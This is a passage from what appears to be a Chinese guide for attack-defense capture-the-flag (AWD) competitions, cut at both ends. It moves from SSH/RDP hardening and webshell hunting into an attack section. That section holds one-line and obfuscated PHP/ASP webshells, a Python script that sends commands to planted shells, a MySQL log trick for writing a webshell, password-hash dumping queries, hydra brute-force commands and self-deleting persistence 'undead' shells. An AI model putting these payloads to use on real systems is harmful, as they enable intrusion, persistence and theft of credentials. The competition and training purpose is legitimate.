+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nano /etc/ssh/sshd_config       <span class="hljs-comment">//以root权限编辑SSH配置文件</span><br>AllowUsers username@<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.100</span>    <span class="hljs-comment">//找到并编辑以下行，确保其取消注释并设置为所需的IP地址</span><br></code></pre></td></tr></table></figure>
+
+<p>禁用 <code>root</code> 远程登录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nano /etc/ssh/sshd_config       <span class="hljs-comment">//以root权限编辑SSH配置文件</span><br>PermitRootLogin no                   <span class="hljs-comment">//将PermitRootLogi设置为“no”</span><br></code></pre></td></tr></table></figure>
+
+<p>按用户和组限制SSH登录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nano /etc/ssh/sshd_config       <span class="hljs-comment">//以root权限编辑SSH配置文件</span><br>AllowUsers testuser                  <span class="hljs-comment">//设置只允许 testuser 登录SSH</span><br>AllowUsers testuser@<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>    <span class="hljs-comment">//设置只允许 192.168.1.100 的机器用 testuser 账户登录SSH</span><br>AllowGroups test                     <span class="hljs-comment">//设置用户组白名单</span><br><span class="hljs-comment">//需要注意的是：如果同时指定了 AllowUsers 与 AllowGroups 那么必须要在两个选项中都匹配到的用户才能进行SSH登录</span><br></code></pre></td></tr></table></figure>
+
+<p>重启SSH服务</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo service sshd restart<br>sudo systemctl restart sshd.service<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-4-2-RDP远程登录安全加固"><a href="#2-4-2-RDP远程登录安全加固" class="headerlink" title="2.4.2 RDP远程登录安全加固"></a>2.4.2 RDP远程登录安全加固</h4><p>删除默认帐户并手动添加新用户：</p>
+<ul>
+<li>步骤1：按 <code>Win + R</code> 打开运行对话框，输入 <code>secpol.msc</code> 并单击 “确定”</li>
+<li>步骤2：导航至此处：本地策略–&gt;用户权限分配，再双击打开 “允许通过远程桌面服务登录”</li>
+<li>步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组）</li>
+<li>步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户</li>
+</ul>
+<p>更改默认RDP端口号：</p>
+<ul>
+<li>步骤1：打开运行对话框，输入 <code>regedit</code> 并单击 “确定”</li>
+<li>步骤2：打开 <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</code> ，向下滚动并找到 <code>PortNumber</code> 然后双击它</li>
+<li>步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定”</li>
+</ul>
+<h3 id="2-5-应急响应"><a href="#2-5-应急响应" class="headerlink" title="2.5# 应急响应"></a>2.5# 应急响应</h3><h4 id="2-5-1-查询进程线程"><a href="#2-5-1-查询进程线程" class="headerlink" title="2.5.1 查询进程线程"></a>2.5.1 查询进程线程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">netstat<br>ps -aux<br>netstat -apt<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-5-2-杀掉进程"><a href="#2-5-2-杀掉进程" class="headerlink" title="2.5.2 杀掉进程"></a>2.5.2 杀掉进程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">kill <span class="hljs-number">-9</span> pid            <span class="hljs-comment">//Linux上</span><br>taskkill /f /pid pid   <span class="hljs-comment">//Windows上</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-5-3-搜索WebShell文件"><a href="#2-5-3-搜索WebShell文件" class="headerlink" title="2.5.3 搜索WebShell文件"></a>2.5.3 搜索WebShell文件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">find /var/www/html -name *.php -mmin <span class="hljs-number">-5</span>                        <span class="hljs-comment">//查看最近5分钟修改文件</span><br>find ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs wc -l | sort -u                  <span class="hljs-comment">//寻找行数最短文件，一般有可能是一句话木马</span><br>grep -r --include=*.php  <span class="hljs-string">&#x27;[^a-z]eval($_POST&#x27;</span>  /var/www/html    <span class="hljs-comment">//查包含关键字的php文件</span><br>find /var/www/html -type f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span> |more <span class="hljs-comment">//在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串&quot;eval(&quot;的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-5-4-查杀不死马"><a href="#2-5-4-查杀不死马" class="headerlink" title="2.5.4 查杀不死马"></a>2.5.4 查杀不死马</h4><p>也可以利用命令自动进行查找删除</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ps -aux | grep www-data | grep -v grep | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs kill <span class="hljs-number">-9</span><br></code></pre></td></tr></table></figure>
+
+<p>然后重启服务</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">service php-fpm restart<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-5-5-杀弹反弹shell"><a href="#2-5-5-杀弹反弹shell" class="headerlink" title="2.5.5 杀弹反弹shell"></a>2.5.5 杀弹反弹shell</h4><p>老规矩查看进程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ps -ef<br>px -aux<br>ps -aux | grep www-data<br></code></pre></td></tr></table></figure>
+
+<p>注意 <code>www-data</code> 权限的 <code>/bin/sh</code>，很有可能是nc</p>
+<p>再就是上老一套命令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kill ps -aux | grep www-data | grep apache2 | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-自由攻击环节（Attack）"><a href="#3-自由攻击环节（Attack）" class="headerlink" title="3# 自由攻击环节（Attack）"></a>3# 自由攻击环节（Attack）</h2><h3 id="3-0-主要准备内容"><a href="#3-0-主要准备内容" class="headerlink" title="3.0# 主要准备内容"></a>3.0# 主要准备内容</h3><ol>
+<li>各类CMS软件包最新版准备</li>
+<li>扫描工具：Nmap、Nessus、Metasploit更新</li>
+<li>漏洞利用脚本Poc、Exp</li>
+</ol>
+<h3 id="3-1-基本信息搜集"><a href="#3-1-基本信息搜集" class="headerlink" title="3.1# 基本信息搜集"></a>3.1# 基本信息搜集</h3><h4 id="3-1-1-主机信息搜集"><a href="#3-1-1-主机信息搜集" class="headerlink" title="3.1.1 主机信息搜集"></a>3.1.1 主机信息搜集</h4><p>Nmap</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -sn <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>            <span class="hljs-comment">//C段存活扫描</span><br></code></pre></td></tr></table></figure>
+
+<p>httpscan</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">httpscan.py <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> –t <span class="hljs-number">10</span>   <span class="hljs-comment">//C段存活扫描</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -sV <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>               <span class="hljs-comment">//扫描主机系统版本</span><br>nmap -sS <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>               <span class="hljs-comment">//扫描主机常用端口</span><br>nmap -sS -p <span class="hljs-number">80</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>     <span class="hljs-comment">//扫描主机部分端口</span><br>nmap -sS -p- <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>           <span class="hljs-comment">//扫描主机全部端口</span><br></code></pre></td></tr></table></figure>
+
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">255</span>): <br>    url = <span class="hljs-string">&quot;http://192.168.1.&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(x) <br>    <span class="hljs-keyword">try</span>: <br>        r = requests.post(url) <br>        <span class="hljs-built_in">print</span>(url) <br>        <span class="hljs-keyword">except</span>: <br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-2-外部打点"><a href="#3-2-外部打点" class="headerlink" title="3.2# 外部打点"></a>3.2# 外部打点</h3><h4 id="3-2-0-常见系统漏洞"><a href="#3-2-0-常见系统漏洞" class="headerlink" title="3.2.0 常见系统漏洞"></a>3.2.0 常见系统漏洞</h4><ul>
+<li>MS17-010（永恒之蓝，可看<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/172.html">https://blog.zgsec.cn/archives/172.html</a>）</li>
+<li>MySQL进行UDF提权（SQL注入或者MySQL弱口令）</li>
+<li>MsSQL进行系统命令执行（SQL注入或者MsSQL弱口令）</li>
+<li>SSH弱口令或默认口令</li>
+<li>PWN（这个要看具体AWD比赛提供的内容了）</li>
+</ul>
+<h4 id="3-2-1-中间件漏洞"><a href="#3-2-1-中间件漏洞" class="headerlink" title="3.2.1 中间件漏洞"></a>3.2.1 中间件漏洞</h4><ul>
+<li>IIS（解析漏洞、远程代码执行）</li>
+<li>Apache（解析漏洞）</li>
+<li>Nginx（解析漏洞）</li>
+<li>Jboss（CVE-2017-7504&#x2F;CVE-2017-12149&#x2F;CVE-2015-7501）</li>
+<li>Mysql（弱口令）</li>
+<li>Tomcat（弱口令Getshell）</li>
+<li>Weblogic（CVE-2020-2551&#x2F;CVE-2020-2555&#x2F;CVE-2020-2883）</li>
+<li>SpringBoot（未授权访问漏洞和RCE漏洞，具体可看<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/129.html">https://blog.zgsec.cn/archives/129.html</a>）</li>
+</ul>
+<h4 id="3-2-2-集成服务环境漏洞"><a href="#3-2-2-集成服务环境漏洞" class="headerlink" title="3.2.2 集成服务环境漏洞"></a>3.2.2 集成服务环境漏洞</h4><ul>
+<li>wampserver</li>
+<li>xamppserver</li>
+</ul>
+<h4 id="3-2-3-CMS漏洞利用"><a href="#3-2-3-CMS漏洞利用" class="headerlink" title="3.2.3 CMS漏洞利用"></a>3.2.3 CMS漏洞利用</h4><p>搜集最新版本的CMS，以及对应的漏洞Poc和Exp，这里仅仅列举部分CMS：</p>
+<ul>
+<li>Aspcms</li>
+<li>Dedecms</li>
+<li>Dicuz</li>
+<li>Drupal</li>
+<li>Empirecms</li>
+<li>Eshop</li>
+<li>Finecms</li>
+<li>Joomla</li>
+<li>Lamp</li>
+<li>Metainfo</li>
+<li>Phpcms</li>
+<li>Phpwind</li>
+<li>Qibocms</li>
+<li>Seacms</li>
+<li>Semcms</li>
+<li>ThinkPHP</li>
+<li>Wolfcms</li>
+<li>Wordpress</li>
+<li>Zabbix</li>
+</ul>
+<p>备份文件爆破：使用7kbScan等目录扫描工具对Web系统进行爆破</p>
+<h4 id="3-2-4-上传WebShell"><a href="#3-2-4-上传WebShell" class="headerlink" title="3.2.4 上传WebShell"></a>3.2.4 上传WebShell</h4><p>常见一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP： <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span>      <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br>Asp：   &lt;%<span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span> (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>Aspx：  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>Get型木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);           <span class="hljs-comment">//利用方式/shell.php?pass=eval($_POST[1]);</span><br></code></pre></td></tr></table></figure>
+
+<p>免杀马制作：<a target="_blank" rel="noopener" href="https://github.com/AabyssZG/WebShell-Bypass-Guide">https://github.com/AabyssZG/WebShell-Bypass-Guide</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>~<span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;$&lt;&gt;/&#x27;</span>^<span class="hljs-string">&#x27;&#123;&#123;&#123;&#123;&#x27;</span>;@$&#123;<span class="hljs-variable">$_</span>&#125;[_](@$&#123;<span class="hljs-variable">$_</span>&#125;[__]);                            <span class="hljs-comment">//执行GET传参 ?_=system&amp;__=whoami 来执行whoami命令</span><br><span class="hljs-meta">&lt;?=</span>~<span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;$&lt;&gt;/&#x27;</span>^<span class="hljs-string">&#x27;&#123;&#123;&#123;&#123;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&#x27;$+4(/&#x27;</span> ^ <span class="hljs-string">&#x27;&#123;&#123;&#123;&#123;&#123;&#x27;</span>;@$&#123;<span class="hljs-variable">$_</span>&#125;[_](@$&#123;<span class="hljs-variable">$___</span>&#125;[__]);   <span class="hljs-comment">//执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell</span><br></code></pre></td></tr></table></figure>
+
+<p>隐藏的文件读取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(php<span class="hljs-string">&#x27;flag:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现</p>
+<h4 id="3-2-5-利用WebShell"><a href="#3-2-5-利用WebShell" class="headerlink" title="3.2.5 利用WebShell"></a>3.2.5 利用WebShell</h4><p>curl(跟hackbar差不多)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\admin&gt;curl <span class="hljs-string">&quot;http://192.168.182.130:8801/include/shell.php&quot;</span> -d <span class="hljs-string">&quot;admin_ccmd=system(&#x27;cat /f*&#x27;);&quot;</span><br><span class="hljs-comment">//向shell.php文件里传入参数并返回结果</span><br></code></pre></td></tr></table></figure>
+
+<p>Python多端口传参</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br>url_head=<span class="hljs-string">&quot;http://192.168.182.130&quot;</span>   <span class="hljs-comment">#网段</span><br>url=<span class="hljs-string">&quot;&quot;</span><br>shell_addr=<span class="hljs-string">&quot;/upload/url/shell.php&quot;</span> <span class="hljs-comment">#木马路径</span><br>passwd=<span class="hljs-string">&quot;pass&quot;</span>                   <span class="hljs-comment">#木马密码</span><br><span class="hljs-comment">#port=&quot;80&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;System(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;<br><span class="hljs-comment"># find / -name &quot;flag*&quot;</span><br><br><span class="hljs-comment">#清空上次记录</span><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>flag.close()<br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8000</span>,<span class="hljs-number">8004</span>):<br>    url=url_head+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(i)+shell_addr<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.post(url,payload)<span class="hljs-comment">#,timeout=1</span><br>        <span class="hljs-keyword">if</span> res.status_code == requests.codes.ok:<br>            result = res.text<br>            <span class="hljs-built_in">print</span> (result)<br>            flag.write(result+<span class="hljs-string">&quot;\n&quot;</span>) <br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;shell 404&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span> (url+<span class="hljs-string">&quot; connect shell fail&quot;</span>)<br><br>flag.close()<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-6-MySQL数据库利用"><a href="#3-2-6-MySQL数据库利用" class="headerlink" title="3.2.6 MySQL数据库利用"></a>3.2.6 MySQL数据库利用</h4><p>具体可以看这篇文章：<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/26.html">https://blog.zgsec.cn/archives/26.html</a></p>
+<p>1、查看MySQL版本</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%version%&#x27;</span>;<br><span class="hljs-keyword">select</span> version();      #这个只显示MySQL版本号<br></code></pre></td></tr></table></figure>
+
+<p>2、查看 <code>load_file()</code> 开启状态</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;       #这条可查看详细信息<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>3、查看日志功能是否开启和对应目录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> &quot;ON&quot;;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;/var/www/html/test.php&#x27;</span>;   #可以写入WebShell然后直接连接蚁剑<br><br># 往日志里面写入 WebShell<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&#x27;</span>AabyssTeam<span class="hljs-string">&#x27;]);?&gt;&#x27;</span>;<br># 此时已经写到 test.php 文件当中了，注意这个要知道网站的具体路径才可以实现<br></code></pre></td></tr></table></figure>
+
+<p>小技巧：获取MySQL账户和对应密码Hash</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"># MySQL <span class="hljs-operator">&lt;=</span> <span class="hljs-number">5.6</span> 版本<br><span class="hljs-keyword">select</span> host, <span class="hljs-keyword">user</span>, password <span class="hljs-keyword">from</span> mysql.user;<br><br># MySQL <span class="hljs-operator">&gt;=</span> <span class="hljs-number">5.7</span> 版本<br><span class="hljs-keyword">select</span> host,<span class="hljs-keyword">user</span>,authentication_string <span class="hljs-keyword">from</span> mysql.user;<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-2-7-弱口令爆破"><a href="#3-2-7-弱口令爆破" class="headerlink" title="3.2.7 弱口令爆破"></a>3.2.7 弱口令爆破</h4><p>爆破SSH密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh<br>hydra -L 用户名字典.txt -P 密码字典.txt ssh:<span class="hljs-comment">//192.168.1.100</span><br>hydra -L 用户名字典.txt -P 密码字典.txt ssh:<span class="hljs-comment">//192.168.1.100 -s 40      //40是⽬标服务开放的端⼝</span><br></code></pre></td></tr></table></figure>
+
+<p>爆破FTP密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp<br>hydra -L 用户名字典.txt -P 密码字典.txt ftp:<span class="hljs-comment">//192.168.1.100/</span><br></code></pre></td></tr></table></figure>
+
+<p>爆破RDP远程桌面密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V<br></code></pre></td></tr></table></figure>
+
+<p>爆破Telnet</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V<br></code></pre></td></tr></table></figure>
+
+<p>爆破MSSQL数据库</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -l sa -P 密码字典.txt 目标IP地址 mssql<br></code></pre></td></tr></table></figure>
+
+<p>爆破MySQL数据库</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-3-内网渗透"><a href="#3-3-内网渗透" class="headerlink" title="3.3# 内网渗透"></a>3.3# 内网渗透</h3><h4 id="3-3-1-权限维持之不死马"><a href="#3-3-1-权限维持之不死马" class="headerlink" title="3.3.1 权限维持之不死马"></a>3.3.1 权限维持之不死马</h4><p>简单不死马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);   <span class="hljs-comment">//PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//ignore_user_abort如果设置为 TRUE，则忽略与用户的断开，脚本将后台运行</span><br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);     <span class="hljs-comment">//删除自身</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;AabyssTeam&quot;]);?&gt;&#x27;</span>);  <span class="hljs-comment">//创建shell.php</span><br>    <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0</span>);    <span class="hljs-comment">//间隔时间</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以通过不断复写 <code>shell.php</code> 来达到该木马难以被使用的效果</p>
+<p>防连接不死马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);   <span class="hljs-comment">// 取消脚本运行时间的超时上限</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// </span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;8c7d608cbb4c63f32be59a9ba8c9f49d&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>);  <span class="hljs-comment">//创建shell.php</span><br>    <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//passwd=AabyssTeam</span><br><span class="hljs-comment">//POST传参：passwd=AabyssTeam&amp;cmd=system(&#x27;ls&#x27;);</span><br></code></pre></td></tr></table></figure>
+
+<p>进阶不死马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php 